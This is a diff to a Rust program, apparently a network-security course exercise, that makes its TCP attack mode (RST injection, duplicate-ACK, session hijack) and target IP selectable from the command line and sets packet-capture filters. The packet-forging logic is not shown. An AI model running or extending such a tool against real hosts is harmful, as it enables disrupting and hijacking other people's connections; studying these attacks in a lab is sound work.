@@ -8,6 +8,7 @@ use std::sync::atomic::{AtomicU32, Ordering};
 use std::thread::sleep;
 use std::thread::{self, Builder};
 use std::time::Duration;
+use std::env;
 
 enum AttackType {
     RSTInjection,
@@ -16,21 +17,40 @@ enum AttackType {
 }
 
 fn main() {
+
+    let args: Vec<String> = env::args().collect();
+
+    if args.len() < 4{
+        eprintln!("Usage: {} <source_ip> <destination_ip> <attack_type>", args[0]);
+        eprintln!("Attack types: rst, dupack, hijack");
+        std::process::exit(1);
+    }
+
+    let source_ip = &args[1];
+    let dest_ip = &args[2];
+    let attack_arg = &args[3];
+
+
+    let (attack_type, filter) = match attack_arg.as_str() {
+        "rst" => {(AttackType::RSTInjection, format!("tcp and host {}", dest_ip))}
+        "dupack" => {(AttackType::DuplicateAck, format!("tcp and host {}", dest_ip))}
+        "hijack" => {(AttackType::SessionHijack, format!("tcp and host {} and port 5000", dest_ip))}
+        _ => {
+            eprintln!("Invalid attack type. Use: rst, dupack, or hijack");
+            std::process::exit(1);
+        }
+    };
+
     let OsInfo {
         interface,
         device_mac,
         device_ip,
     } = OsInfo::fetch().expect("os fetch error");
 
-    let attack_type = &AttackType::SessionHijack;
-
     let mut cap = get_capture(interface.as_str());
     let mut send_cap = get_capture(interface.as_str());
 
-    let task2Filter = "tcp and host 90.130.70.73";
-    let task3Filter = "tcp and port 5000";
-
-    cap.filter(task3Filter, true).expect("filter error");
+    cap.filter(&filter, true).expect("filter error");
 
     println!("listening on interface {} for packets...", interface);
 
@@ -50,7 +70,7 @@ fn main() {
                             ipv4_header,
                             tcp_header,
                             payload,
-                            attack_type,
+                            &attack_type,
                             &mut send_cap,
                             latest_ack,
                         );
